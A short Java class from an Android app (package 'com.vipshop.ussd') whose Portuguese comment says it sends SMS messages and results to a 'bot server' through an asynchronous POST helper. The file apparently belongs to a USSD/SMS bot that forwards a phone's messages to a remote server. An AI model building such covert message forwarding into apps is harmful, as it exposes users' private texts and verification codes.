package com.vipshop.ussd;

import android.content.Context;

/* Envia SMS e resultados ao servidor do bot. */
public class Bot {
    static void enviar(Context c, String caminho, String corpo) {
        Api.enviarAsync(c, "POST", caminho, corpo);
    }
}
